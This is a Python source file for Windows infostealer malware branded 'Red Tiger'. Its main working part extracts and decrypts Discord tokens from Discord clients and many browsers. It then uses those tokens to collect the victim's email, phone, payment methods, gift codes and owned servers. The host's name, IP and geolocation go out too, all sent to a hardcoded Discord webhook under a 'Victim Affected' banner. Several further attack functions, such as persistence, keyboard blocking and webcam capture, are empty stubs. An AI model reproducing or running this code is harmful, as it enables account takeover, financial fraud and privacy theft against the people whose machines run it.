webhook_url = "https://discord.com/api/webhooks/1287745722149769310/UCFPaUInZz5cKkKINPWJLA8RTahaIcDigCYu1DyGv_RZ1KEjXoaU0oUL7m4RI9UI6QXi"
import os
import platform
import ctypes
from screeninfo import *
import psutil
import GPUtil
import sqlite3
from urllib.request import Request, urlopen
import json
from json import *
import socket
import requests
from Crypto.Cipher import AES
import subprocess
import datetime
import base64
import re
import string
import win32api
import discord
from discord import Embed, File, SyncWebhook
import sys
import shutil
from pathlib import Path
from zipfile import ZipFile
from win32crypt import CryptUnprotectData
import uuid
from PIL import ImageGrab
import time
import browser_cookie3
import cv2
import pyautogui
import keyboard

def Block_Key():
    pass
def Unblock_Key():
    pass
def Block_Task_Manager():
    pass
def Block_Mouse():
    pass
def Block_Website():
    pass
def Startup():
    pass
def System_Grab():
    pass
def Open_User_Profile_Settings():
    pass
def Screenshot_Grab():
    pass
def Camera_Capture_Grab():
    pass
def Discord_Grab():
    pass
def Browser_Grab():
    pass
def Roblox_Grab():
    pass
def Fake_Error():
    pass
def Spam_Open_Program():
    pass
def Shutdown():
    pass
    
def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

Clear()

color_embed = 0xB20000
username_embed = 'xyz.pre$ko'
avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_xyz.pre$ko.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
footer_embed = {
        "text": f"Red Tiger | {current_time_day_hour()}",
        "icon_url": avatar_embed,
        }
footer_text = f"xyz.pre$ko | {current_time_day_hour()}"
                 

try:
        hostname_pc = socket.gethostname()
except:
        hostname_pc = "None"

try:
        username_pc = os.getlogin()
except:
        username_pc = "None"


try:
    displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    displayname_pc = "None"

try:
    response = requests.get('https://httpbin.org/ip')
    ip_address_public = response.json()['origin']
except:
    ip_address_public = "None"



try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))  

    ip_address_ipv4 = s.getsockname()[0]
    s.close()
except:
    ip_address_ipv4 = "None"

try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
        ip_address_ipv6 = "None"


try:
    try:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
    except:
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)

    try:
        country_code = ipdata["country_code"].lower()
    except:
        country_code = "None"
except:
    country_code = "None"

try:
    response = requests.get(f"https://xyz.pre$ko/api/ip/ip={ip_address_public}")
    api = response.json()

    ip = api['ip']
    status = api['status']
    country = api['country']
    country_code = api['country_code']
    region = api['region']
    region_code = api['region_code']
    zip_postal = api['zip']
    city = api['city']
    latitude = api['latitude']
    longitude = api['longitude']
    timezone = api['timezone']
    isp = api['isp']
    org = api['org']
    as_number = api['as']
    loc_url = api['loc_url']
    credit = api['credit']
    copyright = api['copyright']
except:
    ip, country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, loc_url = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"

def Discord_Grab():
    class Discord:
        def __init__(self, webhook):
            upload_tokens(webhook).upload()

    class extract_tokens:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.tokens, self.uids = [], []

            self.extract()

        def extract(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _discord = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': token}).json()['id']
                                    if uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)

        def validate_token(self, token: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': token})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_tokens:
        def __init__(self, webhook: str):
            self.tokens = extract_tokens().tokens
            self.webhook = SyncWebhook.from_url(webhook)

        def upload(self):
            if not self.tokens:
                return

            for token_discord in self.tokens:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()

                try:
                    username_discord = user['username'] + '#' + user['discriminator']
                except:
                    username_discord = "None"

                try:
                    display_name_discord = user['global_name']
                except:
                    display_name_discord = "None"

                try:
                    user_id_discord = user['id']
                except:
                    user_id_discord = "None"

                try:
                    email_discord = user['email']
                except:
                    email_discord = "None"
                
                try:
                    phone_discord = user['phone']
                except:
                    phone_discord = "None"
                
                try:
                    mfa_discord = user['mfa_enabled']
                except:
                    mfa_discord = "None"
                
                try:
                    country_discord = user['locale']
                except:
                    country_discord = "None"

                try:
                    if user['premium_type'] == 0:
                        nitro_discord = 'False'
                    elif user['premium_type'] == 1:
                        nitro_discord = 'Nitro Classic'
                    elif user['premium_type'] == 2:
                        nitro_discord = 'Nitro Boosts'
                    elif user['premium_type'] == 3:
                        nitro_discord = 'Nitro Basic'
                    else:
                        nitro_discord = 'False'
                except:
                    nitro_discord = "None"
                
                try:
                    avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
                except:
                    avatar_url_discord = avatar_embed

                try:
                    bio_discord = user['bio']
                    if not bio_discord.strip() or bio_discord.isspace():
                        bio_discord = "None"
                except:
                    bio_discord = "None"

                try:
                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
                    if guilds_response.status_code == 200:
                        guilds = guilds_response.json()
                        try:
                            owner_guilds = [guild for guild in guilds if guild['owner']]
                            owner_guild_count = len(owner_guilds)
                            owner_guilds_names = [] 
                            if owner_guilds:
                                for guild in owner_guilds:
                                    owner_guilds_names.append(f"{guild['name']} ({guild['id']}) / ")
                                owner_guilds_names = "\n" + "\n".join(owner_guilds_names)
                        except:
                            owner_guild_count = "None"
                            owner_guilds_names = "None" 
                except:
                    owner_guild_count = "None"
                    owner_guilds_names = "None"
            
                try:
                    billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
                    if billing_discord:
                        payment_methods_discord = []

                        for method in billing_discord:
                            if method['type'] == 1:
                                payment_methods_discord.append('CB')
                            elif method['type'] == 2:
                                payment_methods_discord.append("Paypal")
                            else:
                                payment_methods_discord.append('Other')
                        payment_methods_discord = ' / '.join(payment_methods_discord)
                    else:
                        payment_methods_discord = "None"
                except:
                    payment_methods_discord = "None"

                try:
                    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
                    if gift_codes:
                        codes = []
                        for gift_codes_discord in gift_codes:
                            name = gift_codes_discord['promotion']['outbound_title']
                            gift_codes_discord = gift_codes_discord['code']
                            data = f"Gift: {name}\nCode: {gift_codes_discord}"
                            if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                                break
                            gift_codes_discord.append(data)
                        if len(gift_codes_discord) > 0:
                            gift_codes_discord = '\n\n'.join(gift_codes_discord)
                        else:
                            gift_codes_discord = "None"
                    else:
                        gift_codes_discord = "None"
                except:
                    gift_codes_discord = "None"

                embed = Embed(title=f':speech_balloon: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
                embed.set_thumbnail(url=avatar_url_discord)
                embed.add_field(name=":bust_in_silhouette: | Username:",
                                value=f"```{username_discord}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: | Display Name:",
                                value=f"```{display_name_discord}```", inline=True)
                embed.add_field(name=":robot: | Id:",
                                value=f"```{user_id_discord}```", inline=True)
                embed.add_field(name=":e_mail: | Email:",
                                value=f"```{email_discord}```", inline=True)
                embed.add_field(name=":telephone_receiver: | Phone:",
                                value=f"```{phone_discord}```", inline=True)   
                embed.add_field(name=":globe_with_meridians: | Token:",
                                value=f"```{token_discord}```", inline=True)
                embed.add_field(name=":rocket: | Nitro:",
                                value=f"```{nitro_discord}```", inline=True)
                embed.add_field(name=":earth_africa: | Language:",
                                value=f"```{country_discord}```", inline=True)
                embed.add_field(name=":moneybag: | Billing:",
                                value=f"```{payment_methods_discord}```", inline=True)
                embed.add_field(name=":gift: | Gift Code:",
                                value=f"```{gift_codes_discord}```", inline=True)
                embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                value=f"```{mfa_discord}```", inline=True)
                embed.add_field(name=":identification_card: | Bio:",
                                value=f"```{bio_discord}```", inline=True)
                embed.add_field(name=f":link: | Owner Guilds ({owner_guild_count}):",
                                value=f"```{owner_guilds_names}```", inline=True)

                embed.set_footer(text=footer_text, icon_url=avatar_embed)

                self.webhook.send(embed=embed, username=username_embed,
                                  avatar_url=avatar_embed)

    Discord(webhook_url)

payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)
try:
    Block_Key()
except:
    pass
try:
    Block_Task_Manager()
except:
    pass
try:
    Block_Website()
except:
    pass
try:
    Startup()
except:
    pass
try:
    System_Grab()
except:
    pass
try:
    Camera_Capture_Grab()
except:
    pass
try:
    Open_User_Profile_Settings()
except:
    pass
try:
    Screenshot_Grab()
except:
    pass
try:
    Discord_Grab()
except:
    pass
try:
    Browser_Grab()
except:
    pass
try:
    Roblox_Grab()
except:
    pass
try:
    Shutdown()
except:
    pass
payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

try:
    Fake_Error()
except:
    pass
try:
    Spam_Open_Program()
except:
    pass
Clear()
